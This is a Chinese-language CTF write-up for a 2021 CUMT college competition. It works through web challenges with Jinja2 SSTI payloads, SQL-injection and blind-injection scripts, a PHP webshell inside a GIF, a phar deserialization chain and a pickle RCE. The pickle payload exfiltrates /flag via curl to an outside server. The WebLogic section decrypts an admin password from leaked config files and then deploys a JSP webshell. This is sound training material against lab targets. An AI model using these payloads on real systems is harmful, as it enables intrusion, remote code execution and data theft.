---
title: CUMT-Competition-Oct
tags:
  - CUMT
  - CTF
categories: 
  - CTF
description: College CTF 2021/10/7
excerpt: College CTF 2021/10/7
typora-root-url: CUMT-Competition-Oct
abbrlink: 23725
date: 2021-10-07 18:36:25
---

# CUMT CTF Oct

## Web

### SSTI

```http
GET /hello?name={{''|attr(request.cookies.a)|attr(request.cookies.c)|attr(request.cookies.d)(1)|attr(request.cookies.e)()|attr(request.cookies.d)(166)|attr(request.cookies.f)|attr(request.cookies.g)|attr(request.cookies.d)(request.cookies.h)|attr(request.cookies.d)(request.cookies.i)(request.cookies.code)}}  HTTP/1.1

Host: 219.219.61.234:48000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://219.219.61.234:48000/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Cookie: a=__class__; b=__bases__; c=__mro__; d=__getitem__; e=__subclasses__; f=__init__; g=__globals__; h=__builtins__; i=eval;; code=open('/flag').read()

```

没什么好说的，首先可以确定是过滤了下划线(\_)、左右中括号(\[\])，这种情况下尝试性传入request.cookies未被过滤(request.args也没被过滤)，那么可以使用request.cookies绕过下划线乃至各种字符单词过滤，其次过滤的中括号，在Python核心编程中有提及，Python对对象使用\[\]操作符时，返回值为\_\_getitem\_\_函数的返回值，对于Jinjia2模板解析，可以使用attr来获取一个对象的成员，例如obj.a可以使用obj|attr("a")来获取，这样一来就很容易绕过这个题目的过滤了。

> 注意：由于各个题目环境不同，在拿到object.\_\_subclasses\_\_()后理应手动确定**warnings.catch_warnigs**在列表中的位置，该题为166。

### sqli

很基础的过滤，过滤了空格和等于号，union没有过滤，联合查询直接一把梭了。

数据库名：

```http
username=1&password=1'/**/union/**/select/**/1,database()#
```

> cumtctf

表名列名一起爆：

```http
username=1&password=1'/**/union/**/select/**/table_name,column_name/**/from/**/information_schema.columns/**/where/**/!(table_schema<>'cumtctf')/**/limit/**/5,1#
```

> Table Name: flag_table_1 Column Name: flag

这里可以稍微注意下，由于过滤了等于号以及 like，所以可以用  !(sourceData<>cmpData)  这种来绕过,regexp 也可以，这里也给出 regexp 的利用方式：

```http
username=1&password=1'/**/union/**/select/**/table_name,column_name/**/from/**/information_schema.columns/**/where/**/table_schema/**/regexp/**/'cumtctf'/**/limit/**/5,1#
```

出 flag:

```http
username=1&password=1'union/**/select/**/flag,fake/**/from/**/flag_table_1/**/limit/**/0,1#
```

### ez_upload

自己做一张 GIF，注意别破坏文件完整性(GIF 不要改变文件的长度，然后替换数据块就行)，然后上传到服务器，下载下来被处理过的 GIF，使用 010Editor，在文件中加入脚本如下：

```php
<?php echo exec('cat /flag');?>
```

整体二进制：

![image-20211007190027876](image-20211007190027876.png)

![image-20211007190137047](image-20211007190137047.png)

附 URL：

```http
219.219.61.234:7777/?file=upload/998983755.gif
```

### web4-sqli

比较简单的一个盲注，上脚本再解释：

```python
import requests

url = "http://81.69.241.44:25500/index.php"

i = 0
table_name = ""
result = ""
while True:
    i += 1
    for char in range(32, 128):
        # 爆表名
        # payload = f"1'or/**/lpad((select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/regexp/**/'cumtctf'),{i},1)>/**/0x{table_name}{hex(char)[2:]}#"
        # 爆列明
        # payload = f"1'or/**/lpad((select/**/group_concat(distinct/**/column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/regexp/**/'flag_table_1'),{i},1)>/**/0x{table_name}{hex(char)[2:]}#"
        # 爆flag
        payload = f"1'or/**/lpad((select/**/group_concat(flag)/**/from/**/flag_table_1),{i},1)>/**/0x{table_name}{hex(char)[2:]}#"

        data = {
            'username': 'admin',
            'password': payload
        }

        if 'try again' in requests.post(url, data).text and char == 32:
            exit()

        if 'try again' in requests.post(url, data).text:
            table_name += hex(char)[2:]
            result += chr(char)
            print(result, f"i={i} chr={char}")
            break
```

爆出的 Flag：

```
FLAG{YOU_@RE_GOOD_@T_SQL_INJECT}
```

注意 lowerCase 再交。

对上面的 Payload 解释一下：

> lpad 函数这里用作 substr 的替代，lpad(str,i,rstr)表示将 str 左填充入 rstr 使得 str 的长度为 i，当 i 的值小于 str 的长度时，截取 str 返回其左 i 个字符，可做 substr 用。
>
> 数据库名是盲猜的 cumtctf，盲注测试一下就发现是对的。
>
> 过滤了等于号，但是 regexp 以及!<>都是可用的，这里用了 regexp，还是得注意一下 regexp 的匹配规则，^cumtctf$才是对库名为 cumtctf 的精准匹配。
>
> 转十六进制为了防止某些字符在过滤范围里，一般最好转 16 进制进行比较。
>
> select group_concat(dinstinc table_name) from information_schema.columns ... => 该语句中使用聚合函数 group_concat 的目的将表名连接成串，脚本不用改动就可以继续读值，distinct 是去重，没有该操作如果表内有多个列时，可能产生 flag_table_1,flag_table_1 这种类似结果，原因是一个数据表的一个列是单独存放一条记录的，所以表里有 n 列，不去重理论将有 n 个数据表的名字。

### web5-phar

一开始以为是上传题，后来发现不是，可以用 file.php?file=查看所有的源代码，附上:

file.php:

```php
<?php
header("content-type:text/html;charset=utf-8");
include 'function.php';
include 'class.php';
$file = $_GET["file"] ? $_GET['file'] : "";
if(empty($file)) {
    echo "<h2>select your file~<h2/>";
}
$show = new Show();
if(file_exists($file)) {
    $show->filename = $file;
    $show->show();
} else if (!empty($file)){
    die('what\'s wrong with your filepath?');
}
?>
```

然后看 function.php：

```php
<?php
include "base.php";
error_reporting(0);
function upload_do() {
    global $_FILES;
    $filename = md5($_FILES["file"]["name"]).".jpg";
    if(file_exists("upload/" . $filename)) {
        unlink($filename);
    }
    move_uploaded_file($_FILES["file"]["tmp_name"],"upload/" . $filename);
    echo '<script type="text/javascript">alert("上传成功!");</script>';
}
function upload_file() {
    global $_FILES;
    if(upload_check()) {
        upload_do();
    }
}
function upload_check() {
    global $_FILES;
    $white_types = array("gif","jpeg","jpg","png");
    $temp = explode(".",$_FILES["file"]["name"]);
    $extension = end($temp);
    if(empty($extension)) {
    }
    else{
        if(in_array($extension,$white_types)) {
            return true;
        }
        else {
            echo '<script type="text/javascript">alert("Invalid file!");</script>';
            return false;
        }
    }
}
?>
```

class.php

```php
<?php

class File{
    public $fakefile;
    public $file;
    public function __construct($file)
    {
        $this->file = $file;
    }
    public function __destruct()
    {
        $this->file=$this->fakefile;
        echo $this->file;
    }
}

class Show{
    public $filename;
    public function show()
    {
        if(preg_match('/\.\.|flag/i',$this->filename)) {
            die('hacker!');
        } else {
            highlight_file($this->filename);
        }

    }
}

class Docker{
    public $str;
    public $container1;
    public $container2;
    function __toString()
    {
        if (isset($this->str))
            return $this->str->get_file();
    }
}


class Cloud{
    private $value;
    public $docker;
    function get_file(){
        $this->test=unserialize($this->docker);
        if($this->test->container1===$this->test->container1){
            $text = base64_encode(file_get_contents($this->value));
            return $text;
        }
    }
}
```

分析可以看出，在 Class Show 里过滤了 flag 这个单词，并且 Class.php 中有三个未用到的类，暗示这是一个反序列化的题，但是我们无法传入字符串，并且有上传点，可以总结出这是一个 phar 反序列化题。

接着分析构造链，对于类 Show，我们可以不关注，对于各个类中的魔术方法显然是关注的重点，File 的析构函数出现了**echo**，说明可能存在**\_\_toString**方法利用，而在 Docker 类中确实发现了有该方法，再看 Docker 类发现，其**\_toString**调用了**this->str**的**get_file**方法，而这个方法在类 Cloud 中存在定义，并且该方法返回 Base64 编码的文件内容，于是构造链为：

> File::\_\_desctruct->Docker::\_\_toString->Cloud::get_file

附上 Payload：

```php
<?php

class File
{
    public $fakefile;
    public $file;
}

class Show
{
    public $filename;
}

class Docker
{
    public $str;
    public $container1;
    public $container2;
}


class Cloud
{
    public $value;
    public $docker;
}


$file = new File();
$docker = new Docker();
$cloud = new Cloud();
$container1 = new Docker();

$file->fakefile = $docker;
$docker->str = $cloud;
$cloud->docker = serialize($container1);
$cloud->value = '/var/www/html/flag.php';
$phar = new Phar('yoooo.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($file);
$phar->addFromString("exp.txt", "test");
$phar->stopBuffering();
```

完成后计算文件名的 MD5，并通过 file.php 即可拿到 Flag。

```
<?php __HALT_COMPILER(); ?>
PD9waHANCiMkZmxhZz0iZmxhZ3syY2ZkN2VhYjQ1YjhiYjIxZTE2YzY1YjU1ZjYzZWM4ZX0iOw==
```

### web6-pickle

cookie里是一个经Base64编码的Pickle序列化(Protocol=0)内容，直接返回一个os.system('command')似乎没有作用，考虑到可能过滤了某些东西，尝试编码绕过，附脚本：

```python
import pickle
import base64
import os


class Exploit(object):

    def __reduce__(self):
        return (eval, (('eval(__import__("base64").b64decode("X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2N1cmwgaHR0cDovL2Jsb2cuZXZhbGV4cC5tbC9yY2U/YGNhdCAvZmxhZyB8IGJhc2U2NGAnKQ=="))'),))


# s = b"__import__('os').system('curl http://blog.evalexp.ml/rce?`cat /flag | base64`')"
# print(base64.b64encode(s))


data = pickle.dumps(Exploit(), protocol=0)
print(base64.b64encode(data))
# print(pickle.loads(base64.b64decode(
#     'Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFZldmFsKF9faW1wb3J0X18oImJhc2U2NCIpLmI2NGRlY29kZSgiWDE5cGJYQnZjblJmWHlnbmIzTW5LUzV6ZVhOMFpXMG9KMk4xY213Z2FIUjBjRG92TDJKc2IyY3VaWFpoYkdWNGNDNXRiQzl5WTJVL1lHTmhkQ0F2Wm14aFp5QjhJR0poYzJVMk5HQW5LUT09IikpCnAxCnRwMgpScDMKLg==')))

```

这里使用了双重eval，利用Python内置的Base64库将恶意命令编码后发送，注意这道题没有回显，所以选择利用自己的服务器将参数外带出来。

成功拿到：

```http
172.69.35.46 - - [05/Oct/2021:06:40:09 +0000] "GET /rce?Q1VNVENURnszM2Q1MmY1YmM3MjdiODE3M2FjNDE1MjdjYzg0OTc4Nn0= HTTP/1.1" 301 178 "-" "curl/7.64.0"
```

### sqli2

这道题首先过滤了**information_schema**库的使用，其次过滤了<、\>号的使用，等号(**=**)的使用未被过滤，然后再测试了常规函数，常用的**group_concat、lpad**没有被过滤，**select、union、from、as、or**等操作亦未被过滤。

由于过滤了**information_schema**库，这里使用**mysql**这一个库获取库名、表名，附盲注脚本：

```python
import requests

url = "http://219.219.61.234:54380/login.php"

i = 0
table_name = ""
result = ""

while True:
    i += 1
    for char in range(32, 128):
        #payload = f"1'/**/or/**/lpad((select/**/group_concat(database_name)/**/from/**/mysql.innodb_table_stats/**/),{i},1)=/**/0x{table_name}{hex(char)[2:]}#"
        # database_name = flagisHere,mysql,sys,user
        payload = f"1'/**/or/**/lpad((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name='flagisHere'),{i},1)=/**/0x{table_name}{hex(char)[2:]}#"
        # table_name = flAg
        data = {
            'username': 'admin',
            'passwd': payload
        }

        response = requests.post(url, data=data, allow_redirects=False)
        if 'Hello' in response.text:
            table_name += hex(char)[2:]
            result += chr(char)
            print(result, f"i={i} chr={char}")
            break

```

拿到库结果：

> flagisHere,mysql,sys,user

注意数据库有一个user(这就是这道题正在连接的数据库，所以后面不能直接select * from flAg，不然会取不到数据)，显然flagisHere就是flag的库了。

拿到表结果：

> flAg

好的，由于我们无法访问**information_schema**库，那么我们自然无法拿到列名，因此这里是一个无列名注入，仔细观察返回值，当SQL语句成功执行但是结果为False的时候，HTTP Status为302，SQL语句不成功执行时HTTP Status为500，当SQL语句返回为True时，HTTP Status为200，并且response.txt 内有'Hello'。

从这一层入手，测试这个表有多少列的思路就很明晰了，由于(a,b,c...)=(x,y,z)在MySQL中，如果前者的列数与后者列数不一致，则引发SQL错误，即返回500，否则应返回302或者200.

测试列数请求：

```http
username=admin&passwd=1'/**/or/**/(1,1,1)/**/=/**/(select/**/*/**/from/**/flagisHere.flAg/**/limit/**/0,1)#
```

该请求返回一个302，可以严格的确认该表有三列，虽然我们不知道各列的名字，但是由于未过滤union和as，我们可以方便地对其设置别名。

在MySQL中，dataset_1 union dataset_2返回的结果集列名为dataset_1的列名，因此，不妨构造：

```sql
select `1` from (select 1,2,3 union select * from flagisHere.flAg) as a
```

select  1,2,3的列明即为1,2,3，在这个过程中我们就对flAg表的列名命名了别名1，2，3.

那么接下来的注入就顺理成章，附脚本：

```python
import requests

url = "http://219.219.61.234:54380/login.php"

i = 0
table_name = ""
result = ""

while True:
    i += 1
    for char in range(32, 128):
        # payload = f"1'/**/or/**/lpad((select/**/group_concat(database_name)/**/from/**/mysql.innodb_table_stats/**/),{i},1)=/**/0x{table_name}{hex(char)[2:]}#"
        # database_name = flagisHere
        # payload = f"1'/**/or/**/lpad((select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name='flagisHere'),{i},1)=/**/0x{table_name}{hex(char)[2:]}#"
        # table_name = flAg
        # n_rows = 3
        # n_columns = 3
        # username=admin&passwd=1'/**/or/**/(1,1,1)/**/=/**/(select/**/*/**/from/**/flagisHere.flAg/**/limit/**/0,1) with 302 response
        payload = f"1'/**/or/**/lpad((select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/flagisHere.flAg)as/**/a),{i},1)=/**/0x{table_name}{hex(char)[2:]}#"
        data = {
            'username': 'admin',
            'passwd': payload
        }

        response = requests.post(url, data=data, allow_redirects=False)
        if 'Hello' in response.text:
            table_name += hex(char)[2:]
            result += chr(char)
            print(result, f"i={i} chr={char}")
            break

```

最终在第3列成功的拿到了flag：

> 3,TEST123,FLAG{THISISFAKE},**FLAG{FLAG_1S_H2}**

### weblogic

虽然weblogic 10.3.6.0有很多漏洞，但是都被作者堵得差不多了，然后作者提供了一个任意文件浏览。

先拿到dat文件：

```http
GET /file.jsp?file=security/SerializedSystemIni.dat HTTP/1.1

Host: 81.69.241.44:7011

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9

Connection: close


```

该请求返回的值会显示乱码，最好是直接下载，去除HTTP相应头，剩下纯数据。

再拿密文：

```http
GET /file.jsp?file=config/config.xml HTTP/1.1

Host: 81.69.241.44:7011

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9

Connection: close


```

拿到的密文：

```xml
    <node-manager-username>weblogic</node-manager-username>
    <node-manager-password-encrypted>{AES}9VgweUmigT7OjfK/quYRTd947tkcRiSnnQ1qxe1Sp/c2rUwn65ISTNaLPLxE9xLU</node-manager-password-encrypted>
```

利用解密工具解密文：

```powershell
Invoke-WebLogicPasswordDecryptor -SerializedSystemIni "$CUMTCTF\dat.dat" -CipherText "{AES}9VgweUmigT7OjfK/quYRTd947tkcRiSnnQ1qxe1Sp/c2rUwn65ISTNaLPLxE9xLU"
# result => TheoyuSaysY0uAreRight
```

登录后台，直接部署木马，可选蚁剑JSP马或者JSP大马，个人部署了大马，然后直接连之，拿Flag。

```html
Execute Shell »
Parameter
cat /sorry_about_the_mistake
-----------------------------------------------------------
CUMTCTF{821sjfoi2h08h12t01t0hg23g2hg2}
```



